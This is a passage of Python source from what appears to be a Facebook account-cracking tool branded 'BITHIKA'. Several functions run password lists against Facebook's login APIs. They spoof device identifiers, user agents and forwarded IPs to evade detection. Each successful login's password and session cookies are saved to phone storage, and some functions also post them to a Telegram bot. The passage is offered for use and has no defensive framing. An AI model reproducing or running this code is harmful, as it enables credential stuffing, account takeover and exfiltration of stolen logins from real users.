                        headers = {'User-Agent': ua,
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',	
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/method/auth.login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
                                        cek_apk(session, coki)
                                        open('/sdcard/BITHIKA-FILE-M3-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BITHIKA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass        
                


                        
                
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        #mula = random.choice(["MT7-TL10", "MT7-TL00", "MT7-L09", "MT7-CL00", "MT7-UL00", "MT7-J1"])
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(50,200))+'.0.0.'+str(random.randint(11,49))+'.120;FBBV/'+str(random.randint(111111111,999999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1440};FBLC/en_US;FBRV/'+str(random.randint(111111111,999999999))+';FBCR/Zong;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-'+str(random.randint(1000,1500))+';FBSV/'+str(random.randint(4,13))+'.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        device_id = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'email': uid, 
'password': pas, 
'adid': str(uuid.uuid4()),
'device_id': str(uuid.uuid4()),
'family_device_id': str(uuid.uuid4()),
'session_id': str(uuid.uuid4()),
'advertiser_id': str(uuid.uuid4()),
'reg_instance': str(uuid.uuid4()),
'logged_out_id': str(uuid.uuid4()),
'locale': 'en_US', 
'client_country_code': 'US', 
'cpl': 'true', 'source': 'login',
'format': 'json', 
'omit_response_on_success': 'false', 
'credentials_type': 'password',
'error_detail_type': 'button_with_disabled',
'generate_session_cookies': '1',
'generate_analytics_claim': '1',
'generate_machine_id': '1',
'tier': 'regular',
'currently_logged_in_userid': '0',
'fb_api_req_friendly_name': 'authenticate', 
'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
'fb4a_shared_phone_cpl_experiment': 'fb4a_shared_phone_nonce_cpl_at_risk_v3', 
'fb4a_shared_phone_cpl_group': 'enable_v3_at_risk', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'api_key': '882a8490361da98702bf97a021ddc14d',
'sig': '62f8ce9f74b12f84c123cc23437a4a32'}
                        content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                        headers={'User-Agent': ua,
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Bandwidth': str(random.randint(20000000, 30000000)),
'X-FB-Connection-Quality': 'EXCELLENT',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Friendly-Name': 'authenticate',
'Content-Type': 'application/x-www-form-urlencoded', 
"Content-Length": str(len(content_lenght))}
                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cid = str(po['uid'])
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                        open('/sdcard/BITHIKA-RANDOM-M1-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(cid)
                                        cek_apk(session, coki)
                                        return True
                        elif 'session_key' in po:
                                        cid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        statusok = (f" {uid} | {pas} | {coki} ")
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        return True
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                return True
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

                
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,200)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        #mula = random.choice(["MT7-TL10", "MT7-TL00", "MT7-L09", "MT7-CL00", "MT7-UL00", "MT7-J1"])
                        ua = '[FBAN/FB4A;FBAV/'+str(random.randint(111,999))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/'+str(random.randint(50,200))+'.0.0.'+str(random.randint(11,49))+'.120;FBBV/'+str(random.randint(111111111,999999999))+';FBDM/{density=2'+'.0,width='+'720,height='+'1440};FBLC/en_US;FBRV/'+str(random.randint(111111111,999999999))+';FBCR/Zong;FBMF/nokia;FBBD/nokia;FBPN/com.facebook.katana;FBDV/TA-'+str(random.randint(1000,1500))+';FBSV/'+str(random.randint(4,13))+'.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        device_id = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {"email": uid,
"password": pas,
"adid": str(uuid.uuid4()),
"device_id": str(uuid.uuid4()),
"family_device_id": str(uuid.uuid4()),
"session_id": str(uuid.uuid4()),
"advertiser_id": str(uuid.uuid4()),
"reg_instance": str(uuid.uuid4()),
"logged_out_id": str(uuid.uuid4()),
"locale": "en_US",
"client_country_code": "US",
"cpl": "true",
"source": "login",
"format": "json",
"omit_response_on_success": "false",
"credentials_type": "password",
"error_detail_type": "button_with_disabled",
"generate_session_cookies": "1",
"generate_analytics_claim": "1",
"generate_machine_id": "1",
"tier": "regular",
"currently_logged_in_userid": "0",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
"fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"api_key": "882a8490361da98702bf97a021ddc14d",
"sig": "62f8ce9f74b12f84c123cc23437a4a32"}
                        content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
                        headers={"Host": "graph.facebook.com",
"User-Agent": "[FBAN/FB4A;FBAV/171.1.0.18.43;FBBV/492543489;FBDM/{density=3.0,width=1080,height=2040};FBLC/en_US;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKL-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"Accept-Encoding": "gzip, deflate",
"Accept": "*/*",
"Connection": "keep-alive",
"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"X-FB-SIM-HNI": "28255",
"X-FB-Net-HNI": "28732",
"X-FB-Connection-Bandwidth": "27181576",
"X-FB-Connection-Quality": "EXCELLENT",
"X-FB-Connection-Type": "MOBILE.LTE",
"X-FB-HTTP-Engine": "Liger",
"X-FB-Client-IP": "True",
"X-FB-Friendly-Name": "authenticate",
"Content-Type": "application/x-www-form-urlencoded",
"Content-Length":  str(len(content_lenght))} 
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cid = str(po['uid'])
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                        open('/sdcard/BITHIKA-RANDOM-M2-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(cid)
                                        cek_apk(session, coki)
                                        return True
                        elif 'access_token' in po:
                                        cid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        statusok = (f" {cid} | {pas} | {coki} ")
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        return True
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}JEEVAN-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JEEVAN-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                return True
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass

#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,450)}.0.0.{random.randint(11,60)}.{random.randint(70,300)}'
                        fbbv = str(random.randint(111111111,444444444))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        #fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        icc = random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
                        fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
                        realme= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	                    #redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
                        ua = random.choice(xx)
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid': str(uuid.uuid4()),
'format': 'json',
'device_id': str(uuid.uuid4()),
'email': uid,
'password': pas,
'generate_analytics_claims': '1',
'community_id': '',
'cpl': 'true',
'try_num': '1',
'family_device_id': str(uuid.uuid4()),
'credentials_type': 'password',
'source': 'login',
'error_detail_type': 'button_with_disabled',
'enroll_misauth': 'false',
'generate_session_cookies': '1',
'generate_machine_id': '1',
'currently_logged_in_userid': '0',
'locale': 'it_IT',
'client_country_code': 'IT',
'fb_api_req_friendly_name': 'authenticate',
'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}

                        headers={'User-Agent': ua,
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close',
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(2e4, 4e4)),
'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)),
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-FB-Connection-Type': 'WIFI',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',	
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}

                        url = 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        cid = str(po['uid'])
                                        print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
                                        open('/sdcard/BITHIKA-RANDOM-M3-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(cid)
                                        cek_apk(session, coki)
                                        break
                        elif 'access_token' in po:
                                        cid = str(po['uid'])
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        statusok = (f" {cid} | {pas} | {coki} ")
                                        requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
                                        break
                        elif 'error' in po and 'message' in po['error'] and 'www.facebook.com' in po['error']['message'] and (uid_extracted := re.search(r'uid=(\d+)', po['error']['message'])).group(1) if uid_extracted else None:
                                        if 'y' in pcp:
                                                print(f'\r\r{G}[{Y}BITHIKA-CP{G}]{Y} '+uid_extracted+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BITHIKA-CP.txt','a').write(uid_extracted+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass


def rndm4(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        ipz=generate_unlimited_ips()
        port=random.choice(['80','443','8080'])
        session=requests.Session()
        session.headers.update({'X-Forwarded-For': ipz})
        #proxy_url = f"http://'{ipz}':{port}"proxies=proxy_url,
        au=Ugen()
        try:
                for pas in passlist:
                        free_fb = session.get(f'https://free.facebook.com').text
                        data = {'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': uid,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': '0',
'pass': pas,
'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
'dyn': '',
'csr': '',
'req': 'k',
'a': '',
'__user': '0',
'_fb_noscript': 'true'}
                        headers={'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://m.facebook.com',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=114946765277597&kid_directed_site=0&app_id=114946765277597&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D114946765277597%26auth_type%3Dreauthorize%26cbt%3D1723457889584%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcd17ca0a76dc63a8%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%26client_id%3D114946765277597%26display%3Dpopup%26domain%3Dwww.vecteezy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ffree-videos%252Fcall-to-action-button%253Fpage%253D2%2526srsltid%253DAfmBOoobRdAd8ZTHYUx2XPTH6ck4ZRdyQkFXqUHnpiEXYQH1js0u4jnB%26locale%3Den_US%26logger_id%3Df5dd8ebc54f54b7e1%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df23016ed68f160ca4%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%2526frame%253Df601eb188acd9eb67%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df23016ed68f160ca4%26domain%3Dwww.vecteezy.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ff07b3d8c5688e23bb%26relation%3Dopener%26frame%3Df601eb188acd9eb67%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=en_GB&pl_dbl=0',
'sec-ch-prefers-color-scheme': 'dark',
'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
'sec-ch-ua-mobile': '?1',
'sec-ch-ua-model': '"23128PC33I"',
'sec-ch-ua-platform': '"Android"',
'sec-ch-ua-platform-version': '"13"',
'sec-fetch-dest': 'empty',
'sec-fetch-mode': 'cors',
'sec-fetch-site': 'same-origin',
'user-agent': au,
'x-asbd-id': '129477',
'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
                        response = session.post(f'https://m.facebook.com/login/device-based/login/async/', data=data, headers=headers)
                        if response.status_code == 200:
                            json_response = response.json()
                            if json_response.get('status') == 'ok':
                                if json_response.get('login') == 'success':
                                    session_cookies = session.cookies.get_dict()
                                    coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
                                    print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} ' + cid + f' | ' + pas + '\033[1;97m')
                                    print(f"\r\r{G}[{G}COOKIE{G}]>{R} " + coki)
                                    open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid + ' | ' + pas + ' |-> ' + coki + "\n")
                                    oks.append(cid)
                                    return True
                        else:
                            print(f"[ERROR] - Status code: {response.status_code}")
                            continue
                loop+=1
        except Exception as e:
                pass


def rndm5(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        ipz=generate_unlimited_ips()
        port=random.choice(['80','443','8080'])
        session=requests.Session()
        session.headers.update({'X-Forwarded-For': ipz})
        #proxy_url = f"http://'{ipz}':{port}"proxies=proxy_url,
        au=Ugen()
        try:
                for pas in passlist:
                        free_fb = session.get(f'https://free.facebook.com').text
                        data = {'m_ts':re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
'li':re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
'try_number': '0',
'unrecognized_tries': '0',
'email': uid,
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': 'false',
'had_password_prefilled': 'false',
'is_smart_lock': 'true',
'bi_xrwh': '0',
'pass': pas,
'jazoest':re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
'lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
'dyn': '',
'csr': '',
'req': 'k',
'a': '',
'__user': '0',
'_fb_noscript': 'true'}
                        headers={'authority': 'm.facebook.com',
'accept': '*/*',
'accept-language': 'en-US,en;q=0.9',
'content-type': 'application/x-www-form-urlencoded',
'origin': 'https://m.facebook.com',
'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=114946765277597&kid_directed_site=0&app_id=114946765277597&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fapp_id%3D114946765277597%26auth_type%3Dreauthorize%26cbt%3D1723457889584%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Dfcd17ca0a76dc63a8%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%26client_id%3D114946765277597%26display%3Dpopup%26domain%3Dwww.vecteezy.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ffree-videos%252Fcall-to-action-button%253Fpage%253D2%2526srsltid%253DAfmBOoobRdAd8ZTHYUx2XPTH6ck4ZRdyQkFXqUHnpiEXYQH1js0u4jnB%26locale%3Den_US%26logger_id%3Df5dd8ebc54f54b7e1%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df23016ed68f160ca4%2526domain%253Dwww.vecteezy.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.vecteezy.com%25252Ff07b3d8c5688e23bb%2526relation%253Dopener%2526frame%253Df601eb188acd9eb67%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv3.2%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df23016ed68f160ca4%26domain%3Dwww.vecteezy.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.vecteezy.com%252Ff07b3d8c5688e23bb%26relation%3Dopener%26frame%3Df601eb188acd9eb67%26error%3Daccess_denied%26error_code%3D